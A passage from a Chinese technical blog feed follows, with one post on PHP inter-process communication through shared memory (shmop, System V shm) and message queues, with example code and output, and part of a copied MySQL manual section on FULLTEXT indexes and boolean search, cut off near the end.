        <content type="html"><![CDATA[<p>php作为脚本程序，通常生命周期都很短，如在web应用中，一次请求就是php运行的一个周期，请求结束则生命周期截止。所以php在处理需要共 享的资源时，一般会将共享数据保存在数据库或dbm之类的文件中，再者就是利用内存实现共享。你可以选择已有的工具辅助你，像memcache；也可以自 己编写代码访问操作系统的共享内存段。</p><p>php中对共享内存段的操作有两组函数：System V IPC和Shared Memory。 其中System V IPC系列函数能够更方便的操作数据，无需像Shared Memory那样必须自己掌握读写时的偏移量、长度等，也不用序列化/反序列化来回转换（因为Shared Memory函数只支持字符串格式的数据参数）。但是System V IPC系列不支持Windows，所以如果要在win环境下使用，只能选Shared Memory。</p><p>因为php默认不支持这些函数，所以需要重编译php。如要使用：<br>System V信号量，编译时加上 –enable-sysvsem<br>System V共享内存，编译时加上 –enable-sysvshm<br>System V消息队列，编译时加上 –enable-sysvmsg<br>Shared Memory，编译时加上 –enable-shmop</p><p>先写个Shared Memory的例子：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$key = ftok(<span class="keyword">__FILE__</span>, <span class="string">'i'</span>);</span></span><br><span class="line"><span class="php">$size = <span class="number">100</span>;</span></span><br><span class="line"><span class="php">$shm_h = @shmop_open($key, <span class="string">'c'</span>, <span class="number">0644</span>, $size);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($shm_h === <span class="keyword">false</span>) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"shmop open failed"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">exit</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$data = shmop_read($shm_h, <span class="number">0</span>, $size);</span></span><br><span class="line"><span class="php">$data = unserialize($data);</span></span><br><span class="line"><span class="php"><span class="comment">//如果没有数据则写一个</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">empty</span>($data)) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"there is no data"</span>;</span></span><br><span class="line"><span class="php">        $data = <span class="string">"imdonkey"</span>;</span></span><br><span class="line"><span class="php">        <span class="comment">//就算数据是文本，write时也要序列化</span></span></span><br><span class="line"><span class="php">        $write_size = shmop_write($shm_h, serialize($data), <span class="number">0</span>);</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>($write_size === <span class="keyword">false</span>) <span class="keyword">echo</span> <span class="string">"shmop write failed!"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="comment">//如果有，显示出来，之后删掉</span></span></span><br><span class="line"><span class="php"><span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"shared memory data: "</span>;</span></span><br><span class="line"><span class="php">        print_r($data);</span></span><br><span class="line"><span class="php">        shmop_delete($shm_h);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">shmop_close($shm_h);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line">再写个System V shm的例子：</span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">$shm_key = ftok(<span class="keyword">__FILE__</span>, <span class="string">'i'</span>);</span></span><br><span class="line"><span class="php">$memsize = <span class="number">120</span>;</span></span><br><span class="line"><span class="php">$shm_h = shm_attach($shm_key, $memsize, <span class="number">0644</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($shm_h === <span class="keyword">false</span>) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"shmop open failed"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">exit</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$var_key = <span class="number">3</span>;</span></span><br><span class="line"><span class="php">$data = @shm_get_var($shm_h, $var_key);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">empty</span>($data)) &#123;</span></span><br><span class="line"><span class="php">        $data = <span class="string">"imdonkey"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"there is no data, insert $data.\n"</span>;</span></span><br><span class="line"><span class="php">        shm_put_var($shm_h, $var_key, $data);</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"find data: $data\n"</span>;</span></span><br><span class="line"><span class="php">        shm_remove_var($shm_h, $var_key);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">shm_detach($shm_h);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>可以看到，sysV对于每个数据都另外设立了对应的var_key，这样在同一内存区域可以保存多个数据，而不用像shmop中那样再申请另外一个共享内存区域，还免除了序列化的干扰（虽然数据最终还是以序列化的形式保存，但不用开发者去手动实现）。</p><p>例子虽然简单，但也有一些需要注意的地方，不管是shm_attach还是shmop_open，所申请的内存的大小一定要满足后面数据的体积，这 个体积包括数据本身序列化后的长，还有php添加的少量header信息。php官方文档中有人提出了一种计算要申请的内存大小的公式，这个公式可以保证 所申请的内存足够存储一个指定的数据。公式如下：</p><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="comment">//当shm_attach第一次被调用时，php向共享内存写入一个header</span></span><br><span class="line"><span class="variable">$shmHeaderSize</span> = (PHP_INT_SIZE * 4) + 8;</span><br><span class="line"><span class="comment">//当shm_put_var调用时，php会在序列化后的数据前面，加一个header</span></span><br><span class="line"><span class="variable">$shmVarSize</span> = (((<span class="built_in">strlen</span>(serialize(<span class="variable">$foo</span>))+ (4 * PHP_INT_SIZE)) /4 ) * 4 ) + 4;</span><br><span class="line"><span class="variable">$memsize</span> = <span class="variable">$shmHeaderSize</span> + <span class="variable">$shmVarSize</span>;</span><br></pre></td></tr></table></figure><p>这个公式是否适用于所有情况，我不敢说，所以我想最好还是在程序中，将准备放入共享内存的数据结构设计好，尽量保证数据大小在某一范围内。</p><p>还有就是为了防止共享内存被浪费，当数据无用时及时调用对应的remove方法释放资源。</p><p>介绍完共享内存再顺带提一下消息队列Message Queue（也是在System V IPC函数组中），消息队列似乎可以视为另一种共享内存，只是数据存储的方式有些不同。简单来说，就是每个key对应一个队列，每个队列可以保存多个数据，数据间按照先进先出的原则进行操作。php文档中的例子很好的介绍了各函数的应用：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="keyword">if</span> ( sizeof(<span class="variable">$argv</span>)&lt;2 ) &#123; </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"Usage: <span class="variable">$argv</span>[0] stat|send|receive|remove msgType MSG [msg] \n\n"</span> ; </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"   EX: <span class="variable">$argv</span>[0] send 1 \"This is no 1\" \n"</span> ; </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"       <span class="variable">$argv</span>[0] receive ID \n"</span> ; </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"       <span class="variable">$argv</span>[0] stat \n"</span> ; </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"       <span class="variable">$argv</span>[0] remove \n"</span> ; </span><br><span class="line">        <span class="built_in">exit</span>; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="variable">$MSGKey</span> = <span class="string">"123456"</span> ; </span><br><span class="line"><span class="variable">$seg</span> = msg_get_queue(<span class="variable">$MSGKey</span>) ; </span><br><span class="line"> </span><br><span class="line">switch ( <span class="variable">$argv</span>[1] ) &#123; </span><br><span class="line">    <span class="keyword">case</span> <span class="string">"send"</span>: </span><br><span class="line">        msg_send(<span class="variable">$seg</span>, <span class="variable">$argv</span>[2], <span class="variable">$argv</span>[3]); </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"msg_send done...\n"</span> ; </span><br><span class="line">        <span class="built_in">break</span>; </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">case</span> <span class="string">"receive"</span>: </span><br><span class="line">        <span class="variable">$stat</span> = msg_stat_queue( <span class="variable">$seg</span> ); </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'Messages in the queue: '</span>.<span class="variable">$stat</span>[<span class="string">'msg_qnum'</span>].<span class="string">"\n"</span>; </span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$stat</span>[<span class="string">'msg_qnum'</span>]&gt;0 ) &#123; </span><br><span class="line">            msg_receive(<span class="variable">$seg</span>, <span class="variable">$argv</span>[2], <span class="variable">$msgtype</span>, 1024, <span class="variable">$data</span>, <span class="literal">true</span>, MSG_IPC_NOWAIT); </span><br><span class="line">            var_dump(<span class="variable">$msgtype</span>); </span><br><span class="line">            var_dump(<span class="variable">$data</span>); </span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"\n"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"No Msg...\n"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="built_in">break</span>; </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">case</span> <span class="string">"stat"</span>: </span><br><span class="line">      print_r( msg_stat_queue(<span class="variable">$seg</span>) ); </span><br><span class="line">        <span class="built_in">break</span>; </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">case</span> <span class="string">"remove"</span>: </span><br><span class="line">        msg_remove_queue(<span class="variable">$seg</span>); </span><br><span class="line">        <span class="built_in">break</span>; </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>消息队列中的数据同样受到大小的约束，具体约束范围可通过msg_stat_queue的msg_qbytes看到。这段代码唯一有点小改动的地方就在接受消息时，指定了MSG_IPC_NOWAIT，不然如果目标队列没有数据，默认会一直等待。</p><p>一般会用到共享内存或消息队列的情况，都会涉及到多线程/进程，或跨语言的数据传递。如果是php脚本/进程间共享数据，那只要小心点操作就没什么 问题。如果要求跨语言，那很可能遇到千奇百怪的问题，呵呵，我还没试过，但在网上看到别人发的苦水贴，以后有机会一定实验一下。</p><p>在调试共享内存、信号量、消息队列时，可以配合Linux系统命令观察数据存储情况及信号量、消息队列资源分配情况，如ipcs, ipcrm命令。</p><p>利用PHP操作Linux消息队列完成进程间通信<br>　　当我们开发的系统需要使用多进程方式运行时，进程间通信便成了至关重要的环节。消息队列（message queue）是Linux系统进程间通信的一种方式。</p><p>　　关于Linux系统进程通信的概念及实现可查看：<a href="http://www.ibm.com/developerworks/cn/linux/l-ipc/" target="_blank" rel="noopener">http://www.ibm.com/developerworks/cn/linux/l-ipc/</a></p><p>　　关于Linux系统消息队列的概念及实现可查看：<a href="http://www.ibm.com/developerworks/cn/linux/l-ipc/part4/" target="_blank" rel="noopener">http://www.ibm.com/developerworks/cn/linux/l-ipc/part4/</a><br>　　PHP的sysvmsg模块是对Linux系统支持的System V IPC中的System V消息队列函数族的封装。我们需要利用sysvmsg模块提供的函数来进进程间通信。先来看一段示例代码_1：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line">$message_queue_key = ftok(<span class="keyword">__FILE__</span>, <span class="string">'a'</span>);</span><br><span class="line"> </span><br><span class="line">$message_queue = msg_get_queue($message_queue_key, <span class="number">0666</span>);</span><br><span class="line">var_dump($message_queue);</span><br><span class="line"> </span><br><span class="line">$message_queue_status = msg_stat_queue($message_queue);</span><br><span class="line">print_r($message_queue_status);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//向消息队列中写</span></span><br><span class="line">msg_send($message_queue, <span class="number">1</span>, <span class="string">"Hello,World!"</span>);</span><br><span class="line"> </span><br><span class="line">$message_queue_status = msg_stat_queue($message_queue);</span><br><span class="line">print_r($message_queue_status);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//从消息队列中读</span></span><br><span class="line">msg_receive($message_queue, <span class="number">0</span>, $message_type, <span class="number">1024</span>, $message, <span class="keyword">true</span>, MSG_IPC_NOWAIT);</span><br><span class="line">print_r($message.<span class="string">"\r\n"</span>);</span><br><span class="line"> </span><br><span class="line">msg_remove_queue($message_queue);</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line">这段代码的运行结果如下：</span><br><span class="line">resource(<span class="number">4</span>) of type (sysvmsg queue)</span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [msg_perm.uid] =&gt; <span class="number">1000</span></span><br><span class="line">    [msg_perm.gid] =&gt; <span class="number">1000</span></span><br><span class="line">    [msg_perm.mode] =&gt; <span class="number">438</span></span><br><span class="line">    [msg_stime] =&gt; <span class="number">0</span></span><br><span class="line">    [msg_rtime] =&gt; <span class="number">0</span></span><br><span class="line">    [msg_ctime] =&gt; <span class="number">1279849495</span></span><br><span class="line">    [msg_qnum] =&gt; <span class="number">0</span></span><br><span class="line">    [msg_qbytes] =&gt; <span class="number">16384</span></span><br><span class="line">    [msg_lspid] =&gt; <span class="number">0</span></span><br><span class="line">    [msg_lrpid] =&gt; <span class="number">0</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [msg_perm.uid] =&gt; <span class="number">1000</span></span><br><span class="line">    [msg_perm.gid] =&gt; <span class="number">1000</span></span><br><span class="line">    [msg_perm.mode] =&gt; <span class="number">438</span></span><br><span class="line">    [msg_stime] =&gt; <span class="number">1279849495</span></span><br><span class="line">    [msg_rtime] =&gt; <span class="number">0</span></span><br><span class="line">    [msg_ctime] =&gt; <span class="number">1279849495</span></span><br><span class="line">    [msg_qnum] =&gt; <span class="number">1</span></span><br><span class="line">    [msg_qbytes] =&gt; <span class="number">16384</span></span><br><span class="line">    [msg_lspid] =&gt; <span class="number">2184</span></span><br><span class="line">    [msg_lrpid] =&gt; <span class="number">0</span></span><br><span class="line">)</span><br><span class="line">Hello,World!</span><br></pre></td></tr></table></figure><p>可以看到已成功从消息队列中读取“Hello,World!”字符串<br>　　下面列举一下示例代码中的主要函数：</p><p>ftok ( string $pathname , string $proj )<br>    手册上给出的解释是：Convert a pathname and a project identifier to a System V IPC key。这个函数返回的键值唯一对应linux系统中一个消息队列。在获得消息队列的引用之前都需要调用这个函数。</p><p>msg_get_queue ( int $key [, int $perms ] )<br>    msg_get_queue() 会根据传入的键值返回一个消息队列的引用。如果linux系统中没有消息队列与键值对应，msg_get_queue()将会创建一个新的消息队列。函数 的第二个参数需要传入一个int值，作为新创建的消息队列的权限值，默认为0666。这个权限值与linux命令chmod中使用的数值是同一个意思，因为在linux系统中一切皆是文件。</p><p>msg_send ( resource $queue , int $msgtype , mixed $message [, bool $serialize [, bool $blocking [, int &amp;$errorcode ]]] )<br>    顾名思义，该函数用来向消息队列中写数据。</p><p>msg_stat_queue ( resource $queue )<br>    这个函数会返回消息队列的元数据。消息队列元数据中的信息很完整，包括了消息队列中待读取的消息数、最后读写队列的进程ID等。示例代码在第8行调用该函数返回的数组中队列中待读取的消息数msg_qnum值为0。</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msg_receive (<span class="built_in"> resource </span><span class="variable">$queue</span> , int <span class="variable">$desiredmsgtype</span> , int &amp;<span class="variable">$msgtype</span> , int <span class="variable">$maxsize</span> , mixed &amp;<span class="variable">$message</span> [, bool<span class="variable">$unserialize</span> [, int <span class="variable">$flags</span> [, int &amp;<span class="variable">$errorcode</span> ]]] )</span><br></pre></td></tr></table></figure><pre><code>msg_receive用于读取消息队列中的数据。</code></pre><p>msg_remove_queue ( resource $queue )<br>    msg_remove_queue用于销毁一个队列。<br>示例代码_1只是展示了PHP操作消息队列函数的应用。下面的代码具体描述了进程间通信的场景</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line"><span class="variable">$message_queue_key</span> = ftok(__FILE__, <span class="string">'a'</span>);</span><br><span class="line"><span class="variable">$message_queue</span> = msg_get_queue(<span class="variable">$message_queue_key</span>, <span class="number">0666</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$pids</span> = array();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>;  <span class="variable">$i</span> &lt; <span class="number">5</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        //创建子进程</span><br><span class="line">        <span class="variable">$pids</span>[<span class="variable">$i</span>] = pcntl_fork();</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pids</span>[<span class="variable">$i</span>]) &#123;</span><br><span class="line">                echo <span class="string">"No.<span class="variable">$i</span> child process was created, the pid is <span class="variable">$pids</span>[<span class="variable">$i</span>]\r\n"</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="variable">$pids</span>[<span class="variable">$i</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="variable">$pid</span> = posix_getpid();</span><br><span class="line">                echo <span class="string">"process.<span class="variable">$pid</span> is writing now\r\n"</span>;</span><br><span class="line"> </span><br><span class="line">                msg_send(<span class="variable">$message_queue</span>, <span class="number">1</span>, <span class="string">"this is process.<span class="variable">$pid</span>'s data\r\n"</span>);</span><br><span class="line">                posix_kill(<span class="variable">$pid</span>, SIGTERM);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">        msg_receive(<span class="variable">$message_queue</span>, <span class="number">0</span>, <span class="variable">$message_type</span>, <span class="number">1024</span>, <span class="variable">$message</span>, true, MSG_IPC_NOWAIT);</span><br><span class="line">        echo <span class="variable">$message</span>;</span><br><span class="line"> </span><br><span class="line">        //需要判断队列是否为空，如果为空就退出</span><br><span class="line">        //<span class="keyword">break</span>;</span><br><span class="line">&#125; <span class="keyword">while</span>(true)</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br><span class="line">运行结果为：</span><br><span class="line">No.<span class="number">0</span> child <span class="keyword">process</span> was created, the pid is <span class="number">5249</span></span><br><span class="line">No.<span class="number">1</span> child <span class="keyword">process</span> was created, the pid is <span class="number">5250</span></span><br><span class="line">No.<span class="number">2</span> child <span class="keyword">process</span> was created, the pid is <span class="number">5251</span></span><br><span class="line">No.<span class="number">3</span> child <span class="keyword">process</span> was created, the pid is <span class="number">5252</span></span><br><span class="line">No.<span class="number">4</span> child <span class="keyword">process</span> was created, the pid is <span class="number">5253</span></span><br><span class="line">process.<span class="number">5251</span> is writing now</span><br><span class="line">this is process.<span class="number">5251</span><span class="string">'s data</span></span><br><span class="line"><span class="string">process.5253 is writing now</span></span><br><span class="line"><span class="string">process.5252 is writing now</span></span><br><span class="line"><span class="string">process.5250 is writing now</span></span><br><span class="line"><span class="string">this is process.5253'</span>s <span class="keyword">data</span></span><br><span class="line">this is process.<span class="number">5252</span><span class="string">'s data</span></span><br><span class="line"><span class="string">this is process.5250'</span>s <span class="keyword">data</span></span><br><span class="line">process.<span class="number">5249</span> is writing now</span><br><span class="line">this is process.<span class="number">5249</span><span class="string">'s data</span></span><br></pre></td></tr></table></figure><p>这段程序每次的运行结果都会不同，这正说明了多进程的异步性。从结果也能看出消息队列FIFO特性。</p><p>以上便是我研究的一点心得。接下来将会继续研究PHP利用信号、socket等进行进程间通信的方法。</p><p>转载自：<a href="http://www.cnblogs.com/fengwei/archive/2012/09/12/2682646.html" target="_blank" rel="noopener">http://www.cnblogs.com/fengwei/archive/2012/09/12/2682646.html</a></p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MYSQL的FULLTEXT索引功能</title>
      <link href="/2013/01/06/mysql/MYSQL%E7%9A%84FULLTEXT%E7%B4%A2%E5%BC%95%E5%8A%9F%E8%83%BD/"/>
      <url>/2013/01/06/mysql/MYSQL%E7%9A%84FULLTEXT%E7%B4%A2%E5%BC%95%E5%8A%9F%E8%83%BD/</url>
      
        <content type="html"><![CDATA[<p>下文转自某些手册，你可以用这个语句来创建FULLTEXT类型的索引：</p><p>CREATE FULLTEXT INDEX INDX_TEXT ON ARTICLE (TITLE,NOTE);</p><p>到 3.23.23 时，MySQL 开始支持全文索引和搜索。全文索引在 MySQL 中是一个 FULLTEXT 类型索引。FULLTEXT 索引用于 MyISAM 表，可以在 CREATE TABLE 时或之后使用 ALTER TABLE 或 CREATE INDEX 在 CHAR、VARCHAR 或 TEXT 列上创建。对于大的数据库，将数据装载到一个没有 FULLTEXT 索引的表中，然后再使用 ALTER TABLE (或 CREATE INDEX) 创建索引，这将是非常快的。将数据装载到一个已经有 FULLTEXT 索引的表中，将是非常慢的。</p><p>全文搜索通过 MATCH() 函数完成。</p><p>mysql&gt; CREATE TABLE articles (<br>    -&gt;   id INT UNSIGNED AUTO_INCREMENT NOT NULL PRIMARY KEY,<br>    -&gt;   title VARCHAR(200),<br>    -&gt;   body TEXT,<br>    -&gt;   FULLTEXT (title,body)<br>    -&gt; );<br>Query OK, 0 rows affected (0.00 sec)</p><p>mysql&gt; INSERT INTO articles VALUES<br>    -&gt; (NULL,’MySQL Tutorial’, ‘DBMS stands for DataBase …’),<br>    -&gt; (NULL,’How To Use MySQL Efficiently’, ‘After you went through a …’),<br>    -&gt; (NULL,’Optimising MySQL’,’In this tutorial we will show …’),<br>    -&gt; (NULL,’1001 MySQL Tricks’,’1. Never run mysqld as root. 2. …’),<br>    -&gt; (NULL,’MySQL vs. YourSQL’, ‘In the following database comparison …’),<br>    -&gt; (NULL,’MySQL Security’, ‘When configured properly, MySQL …’);<br>Query OK, 6 rows affected (0.00 sec)<br>Records: 6  Duplicates: 0  Warnings: 0</p><p>mysql&gt; SELECT * FROM articles<br>    -&gt;          WHERE MATCH (title,body) AGAINST (‘database’);<br>+—-+——————-+——————————————+<br>| id | title             | body                                     |<br>+—-+——————-+——————————————+<br>|  5 | MySQL vs. YourSQL | In the following database comparison … |<br>|  1 | MySQL Tutorial    | DBMS stands for DataBase …             |<br>+—-+——————-+——————————————+<br>2 rows in set (0.00 sec)<br>函数 MATCH() 对照一个文本集(包含在一个 FULLTEXT 索引中的一个或多个列的列集)执行一个自然语言搜索一个字符串。搜索字符串做为 AGAINST() 的参数被给定。搜索以忽略字母大小写的方式执行。对于表中的每个记录行，MATCH() 返回一个相关性值。即，在搜索字符串与记录行在 MATCH() 列表中指定的列的文本之间的相似性尺度。</p><p>当 MATCH() 被使用在一个 WHERE 子句中时 (参看上面的例子)，返回的记录行被自动地以相关性从高到底的次序排序。相关性值是非负的浮点数字。零相关性意味着不相似。相关性的计算是基于：词在记录行中的数目、在行中唯一词的数目、在集中词的全部数目和包含一个特殊词的文档(记录行)的数目。</p><p>它也可以执行一个逻辑模式的搜索。这在下面的章节中被描述。</p><p>前面的例子是函数 MATCH() 使用上的一些基本说明。记录行以相似性递减的顺序返回。</p><p>下一个示例显示如何检索一个明确的相似性值。如果即没有 WHERE 也没有 ORDER BY 子句，返回行是不排序的。</p><p>mysql&gt; SELECT id,MATCH (title,body) AGAINST (‘Tutorial’) FROM articles;<br>+—-+—————————————–+<br>| id | MATCH (title,body) AGAINST (‘Tutorial’) |<br>+—-+—————————————–+<br>|  1 |                        0.64840710366884 |<br>|  2 |                                       0 |<br>|  3 |                        0.66266459031789 |<br>|  4 |                                       0 |<br>|  5 |                                       0 |<br>|  6 |                                       0 |<br>+—-+—————————————–+<br>6 rows in set (0.00 sec)<br>下面的示例更复杂一点。查询返回相似性并依然以相似度递减的次序返回记录行。为了完成这个结果，你应该指定 MATCH() 两次。这不会引起附加的开销，因为 MySQL 优化器会注意到两次同样的 MATCH() 调用，并只调用一次全文搜索代码。</p><p>mysql&gt; SELECT id, body, MATCH (title,body) AGAINST<br>    -&gt; (‘Security implications of running MySQL as root’) AS score<br>    -&gt; FROM articles WHERE MATCH (title,body) AGAINST<br>    -&gt; (‘Security implications of running MySQL as root’);<br>+—-+————————————-+—————–+<br>| id | body                                | score           |<br>+—-+————————————-+—————–+<br>|  4 | 1. Never run mysqld as root. 2. … | 1.5055546709332 |<br>|  6 | When configured properly, MySQL … |   1.31140957288 |<br>+—-+————————————-+—————–+<br>2 rows in set (0.00 sec)<br>MySQL 使用一个非常简单的剖析器来将文本分隔成词。一个“词”是由文字、数据、“’” 和 “_” 组成的任何字符序列。任何在 stopword 列表上出现的，或太短的(3 个字符或更少的)的 “word” 将被忽略。</p><p>在集和查询中的每个合适的词根据其在集与查询中的重要性衡量。这样，一个出现在多个文档中的词将有较低的权重(可能甚至有一个零权重)，因为在这个特定的 集中，它有较低的语义值。否则，如果词是较少的，它将得到一个较高的权重。然后，词的权重将被结合用于计算记录行的相似性。</p><p>这样一个技术工作可很好地工作与大的集(实际上，它会小心地与之谐调)。 对于非常小的表，词分类不足以充份地反应它们的语义值，有时这个模式可能产生奇怪的结果。</p><p>mysql&gt; SELECT * FROM articles WHERE MATCH (title,body) AGAINST (‘MySQL’);<br>Empty set (0.00 sec)<br>在上面的例子中，搜索词 MySQL 却没有得到任何结果，因为这个词在超过一半的记录行中出现。同样的，它被有效地处理为一个 stopword (即，一个零语义值的词)。这是最理想的行为 – 一个自然语言的查询不应该从一个 1GB 的表中返回每个次行(second row)。</p><p>匹配表中一半记录行的词很少可能找到相关文档。实际上，它可能会发现许多不相关的文档。我们都知道，当我们在互联网上通过搜索引擎试图搜索某些东西时，这会经常发生。因为这个原因，在这个特殊的数据集中，这样的行被设置一个低的语义值。</p><p>到 4.0.1 时，MySQL 也可以使用 IN BOOLEAN MODE 修饰语来执行一个逻辑全文搜索。</p><p>mysql&gt; SELECT * FROM articles WHERE MATCH (title,body)<br>    -&gt;     AGAINST (‘+MySQL -YourSQL’ IN BOOLEAN MODE);<br>+—-+——————————+————————————-+<br>| id | title                        | body                                |<br>+—-+——————————+————————————-+<br>|  1 | MySQL Tutorial               | DBMS stands for DataBase …        |<br>|  2 | How To Use MySQL Efficiently | After you went through a …        |<br>|  3 | Optimising MySQL             | In this tutorial we will show …   |<br>|  4 | 1001 MySQL Tricks            | 1. Never run mysqld as root. 2. … |<br>|  6 | MySQL Security               | When configured properly, MySQL … |<br>+—-+——————————+————————————-+<br>这个查询返回所有包含词 MySQL 的记录行(注意： 50% 的阈值没有使用)，但是它没有包含词 YourSQL。注意，一个逻辑模式的搜索不会自动地以相似值的降序排序记录行。你可以从上面的结果出看得出来，最高的相似值(包含 MySQL 两次的那个) 最列在最后，而不是第一位。一个逻辑全文搜索即使在没有一个 FULLTEXT 索引的情况下也可以工作，然而它 慢 些。</p><p>逻辑全文搜索支持下面的操作符：</p><p>+<br>一个领头的加号表示，该词必须出现在每个返回的记录行中。<br>-<br>一个领头的减号表示，该词必须不出现在每个返回的记录行中。</p><p>缺省的 (当既没有加号也没有负号被指定时)词是随意的，但是包含它的记录行将被排列地更高一点。这个模仿没有 IN BOOLEAN MODE 修饰词的 MATCH() … AGAINST() 的行为。<br>&lt; &gt;<br>这两个操作符用于改变一个词的相似性值的基值。&lt; 操作符减少基值，&gt; 操作符则增加它。参看下面的示例。<br>( )<br>圆括号用于对子表达式中的词分组。<br>~<br>一个领头的否定号的作用象一个否定操作符，引起行相似性的词的基值为负的。它对标记一个噪声词很有用。一个包含这样的词的记录将被排列得低一点，但是不会被完全的排除，因为这样可以使用 - 操作符。<br>*<br>一个星号是截断操作符。不想其它的操作符，它应该被追加到一个词后，不加在前面。<br>“<br>短语，被包围在双引号”中，只匹配包含这个短语(字面上的，就好像被键入的)的记录行。<br>这里是一些示例：</p><p>apple banana<br>找至少包含上面词中的一个的记录行<br>+apple +juice<br>… 两个词均在被包含<br>+apple macintosh<br>… 包含词 “apple”，但是如果同时包含 “macintosh”，它的排列将更高一些<br>+apple -macintosh<br>… 包含 “apple” 但不包含 “macintosh”<br>+apple +(&gt;pie &lt;strudel)<br>… 包含 “apple” 和 “pie”，或者包含的是 “apple” 和 “strudel” (以任何次序)，但是 “apple pie” 排列得比 “apple strudel” 要高一点<br>apple*<br>… 包含 “apple”，“apples”，“applesauce” 和 “applet”<br>“some words”<br>… 可以包含 “some words of wisdom”，但不是 “some noise words”<br>6.8.1 全文的限制</p><p>MATCH() 函数的所有参数必须是从来自于同一张表的列，同时必须是同一个FULLTEXT 索引中的一部分，除非 MATCH() 是 IN BOOLEAN MODE 的。<br>MATCH() 列列表必须确切地匹配表的某一 FULLTEXT 索引中定义的列列表，除非 MATCH() 是 IN BOOLEAN MODE 的。<br>AGAINST() 的参数必须是一个常量字符串。<br>6.8.2 微调 MySQL 全文搜索</p><p>不幸地，全文搜索仍然只有很少的用户可调参数，虽然增加一些在 TODO 上排列很高。如果你有一个 MySQL 源码发行(查看章节 2.3 安装一个 MySQL 源码发行)，你可以发挥对全文搜索的更多控制。</p><p>注意，全文搜索为最佳的搜索效果，被仔细地调整了。修改默认值的行为，在大多数情况下，只会使搜索结果更糟。不要修改 MySQL 的源代码，除非你知道你在做什么！</p><p>被索引的词的最小长度由 MySQL 变量 ft_min_word_len 指定。查看章节 4.5.6.4 SHOW VARIABLES。 将它改为你所希望的值，并重建你的 FULLTEXT 索引。 (这个变量只从 MySQL 4.0 开始被支持)<br>stopword 列表可以从 ft_stopword_file 变量指定的文件中读取。查看章节 4.5.6.4 SHOW VARIABLES。 在修改了 stopword 列表后，重建你的 FULLTEXT 索引。(这个变量只从 MySQL 4.0.10 开始被支持)<br>50% 阈值选择由所选择的特殊的衡量模式确定。为了禁止它，修改 `myisam/ftdefs.h’ 文件中下面的一行：</p><p>#define GWS_IN_USE 